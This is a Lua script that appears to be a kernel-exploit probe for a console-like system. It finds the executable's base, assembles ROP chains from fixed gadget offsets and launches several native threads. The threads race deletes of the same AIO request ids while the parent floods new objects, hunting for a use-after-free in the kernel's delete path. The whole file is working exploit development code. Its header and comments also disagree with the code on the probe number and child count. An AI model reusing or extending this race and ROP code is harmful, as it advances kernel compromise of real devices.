-- CRASH_CLASS: HIGH
-- PROBE 523c: AIO delete race on native threads (fixed stack layout)
--
-- Context: 523a ran 300 iterations of three children racing one freshly
-- created id and always produced exactly one 0 and two 0x80020003: the
-- children start about a millisecond apart, so the losers fail at the FIRST
-- table lookup (slot already removed) and never overlap inside the delete's
-- unlock/re-lookup window. 523b/523c-v1 built long chains from rsp = top - 8
-- and died inside the first thr_new: a thr_new child starts at
-- stack_base + size and runs its chain UPWARD from there, so the chain must
-- live above the stack region, inside the same allocation
-- (docs/THREADING_ALIVE_14_10.md).
--
-- This probe first proves the layout with ONE child deleting 20 ids, then
-- launches TWO children that each delete the same 100 ids. If the delete's
-- post-unlock re-lookup loses the race, two children report status 0 for the
-- same id. Overlaps are printed as they are observed, so a crash after a hit
-- still leaves the evidence.

print("=== PROBE 526c: swap window, 6 children ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("[A] eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local function emit_sysarch_preamble(emit)
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
end

local IDS = 120
local SMOKE = 20
local RACE_START = SMOKE
local RACE_COUNT = IDS - SMOKE

local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_thr_new = mk(455)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local ids_buf = memory.alloc(IDS * 4 + 64)
local poll_out = memory.alloc(0x40)

local function create_polled()
    for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok or N(rv) ~= 0 then return nil end
    local id = rd(N(out_id))
    if id == nil then return nil end
    local cell = memory.alloc(16)
    wd(N(cell), id)
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    return id, rd(N(poll_out))
end

print(string.format("[B] creating %d polled requests", IDS))
local made = {}
for i = 1, IDS do
    local id = create_polled()
    if id == nil then break end
    made[#made + 1] = id
    wd(N(ids_buf) + (i - 1) * 4, id)
    if i % 40 == 0 then print(string.format("    %d/%d", i, IDS)) end
end
print(string.format("    created=%d", #made))
if #made < IDS then print("    short create; aborting"); return end
if not alive() then print("DEAD while creating"); return end

-- A child that deletes ids [first, first+count) into status[0..count)
local function build_child(first, count)
    local status = memory.alloc(count * 4 + 64)
    for i = 0, count * 4 - 4, 4 do wd(N(status) + i, 0xCCCCCCCC) end

    local CHAIN_MAX = 0x8000
    local stk = memory.alloc(0x8000 + CHAIN_MAX)
    local sb = N(stk)
    local ss = 0x8000
    local rsp = sb + ss - 8   -- kernel rsp is stack_base+size-8 (523a)

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    emit_sysarch_preamble(emit)
    for i = 0, count - 1 do
        emit(g_pop_rdi); emit(uint64(N(ids_buf) + (first + i) * 4))
        emit(g_pop_rsi); emit(uint64(1))
        emit(g_pop_rdx); emit(uint64(N(status) + i * 4))
        emit(g_pop_rax); emit(uint64(662))
        emit(stub)
    end
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)

    return par, status, off
end

-- [C] smoke: one child, 20 deletes, must all be 0
print("")
print(string.format("[C] smoke: one child, %d deletes", SMOKE))
local smoke_par, smoke_status, smoke_len = build_child(0, SMOKE)
print(string.format("    chain bytes=%d", smoke_len))
local ok, rv = pcall(function() return sc_thr_new(smoke_par, uint64(0x38)) end)
print(string.format("    thr_new ok=%s rv=%s alive=%s", tostring(ok), tostring(N(rv)), tostring(alive())))

local spins = 0
local idle = 0
local last = -1
while spins < 100000 do
    local seen = 0
    for i = 0, SMOKE - 1 do if rd(N(smoke_status) + i * 4) ~= -858993460 then seen = seen + 1 end end
    if seen == SMOKE then break end
    if seen == last then idle = idle + 1; if idle > 3000 then break end else idle = 0; last = seen end
    spins = spins + 1
end
local smoke_zero, smoke_other = 0, 0
for i = 0, SMOKE - 1 do
    local v = rd(N(smoke_status) + i * 4)
    if v == 0 then smoke_zero = smoke_zero + 1
    elseif v ~= -858993460 then smoke_other = smoke_other + 1 end
end
print(string.format("    smoke result: zero=%d other=%d alive=%s", smoke_zero, smoke_other, tostring(alive())))
if not alive() then print("DEAD after smoke"); return end

-- [D] race: three children over the same ids, parent creates and polls under them
--
-- Why this shape: the delete path takes the table lock, looks the id up, then
-- at 13.60 0x3afe67 drops it and re-looks-up at 0x3afe7c before freeing
-- [item2+0x18]. If the slot was freed and re-filled inside that gap, the
-- second lookup returns the NEW item and the free hits the new object.
-- Three detectors, all independent of a crash:
--   1. a child delete returning 0x80020010 means lookup2 found an item whose
--      state is not 3/4 - i.e. a freshly created (unpolled) object, the swap
--   2. a child delete returning 0 means it passed the state gate
--   3. a parent object created during the race whose own poll afterwards
--      returns something other than 0x3/0x10003 has had its S freed
local KIDS = 6
print("")
print(string.format("[D] race: %d children x %d deletes, parent filling underneath", KIDS, RACE_COUNT))
local pars, stats = {}, {}
for c = 1, KIDS do
    local p, st, len = build_child(RACE_START, RACE_COUNT)
    pars[c] = p
    stats[c] = st
    print(string.format("    child %d chain bytes=%d", c, len))
end
for c = 1, KIDS do
    local ok2, rv2 = pcall(function() return sc_thr_new(pars[c], uint64(0x38)) end)
    print(string.format("    launch child %d: ok=%s rv=%s alive=%s", c, tostring(ok2), tostring(N(rv2)), tostring(alive())))
    if not alive() then print("DEAD launching"); return end
end

-- parent storm: create+poll in a tight loop while the children delete
local parent_ids, parent_poll = {}, {}
local fill_fail, fill_spin = 0, 0
local FILL_MAX = 700
while #parent_ids < FILL_MAX do
    local id, ps = create_polled()
    if id == nil then
        fill_fail = fill_fail + 1
        if fill_fail > 4 then break end
    else
        fill_fail = 0
        parent_ids[#parent_ids + 1] = id
        parent_poll[#parent_poll + 1] = ps
    end
    fill_spin = fill_spin + 1
end
print(string.format("[E] parent filled %d objects (fail=%d) alive=%s", #parent_ids, fill_fail, tostring(alive())))
if not alive() then print("DEAD during fill"); return end

-- [F] wait for the children, histogram every status
local hist = {}
local examples = {}
spins = 0
idle = 0
last = -1
while spins < 400000 do
    local done = 0
    for c = 1, KIDS do
        for i = 0, RACE_COUNT - 1 do
            if rd(N(stats[c]) + i * 4) ~= -858993460 then done = done + 1 end
        end
    end
    if done == KIDS * RACE_COUNT then break end
    if done == last then idle = idle + 1; if idle > 6000 then break end else idle = 0; last = done end
    spins = spins + 1
end
local double_zero, one_zero, none_zero = 0, 0, 0
for i = 0, RACE_COUNT - 1 do
    local z = 0
    for c = 1, KIDS do
        local v = rd(N(stats[c]) + i * 4)
        if v ~= nil and v ~= -858993460 then
            local key = string.format("%08X", v % 4294967296)
            hist[key] = (hist[key] or 0) + 1
            if v == 0 then z = z + 1 end
            if v ~= 0 and v ~= -2147352573 and v ~= -2147352560 and #examples < 12 then
                examples[#examples + 1] = string.format("id %d child %d status %s", made[RACE_START + i + 1], c, key)
            end
        end
    end
    if z >= 2 then double_zero = double_zero + 1 elseif z == 1 then one_zero = one_zero + 1 else none_zero = none_zero + 1 end
end
print("[F] TALLY")
print(string.format("    ids: two-zero=%d one-zero=%d none=%d", double_zero, one_zero, none_zero))
local keys = {}
for k in pairs(hist) do keys[#keys + 1] = k end
table.sort(keys)
for i = 1, #keys do print(string.format("    status %s x %d", keys[i], hist[keys[i]])) end
for i = 1, #examples do print("    " .. examples[i]) end
print(string.format("    alive=%s", tostring(alive())))

-- [G] the parent's own objects: did any lose its S to a swap?
print("[G] auditing parent objects")
local bad_poll, bad_del, good = 0, 0, 0
for i = 1, #parent_ids do
    local cell = memory.alloc(16)
    wd(N(cell), parent_ids[i])
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    local ps = rd(N(poll_out))
    local st2 = memory.alloc(16)
    wd(N(st2), 0xCCCCCCCC)
    pcall(function() sc_delete(uint64(N(cell)), uint64(1), uint64(N(st2))) end)
    local ds = rd(N(st2))
    if ps ~= 0x3 and ps ~= 0x10003 then
        bad_poll = bad_poll + 1
        if bad_poll <= 8 then print(string.format("    ODD poll id=%d -> %08X", parent_ids[i], (ps or 0) % 4294967296)) end
    elseif ds ~= 0 then
        bad_del = bad_del + 1
        if bad_del <= 8 then print(string.format("    ODD delete id=%d poll=%08X -> %08X", parent_ids[i], (ps or 0) % 4294967296, (ds or 0) % 4294967296)) end
    else
        good = good + 1
    end
    if not alive() then print("    DIED auditing object " .. i); return end
end
print(string.format("[H] audit: good=%d bad_poll=%d bad_del=%d alive=%s", good, bad_poll, bad_del, tostring(alive())))
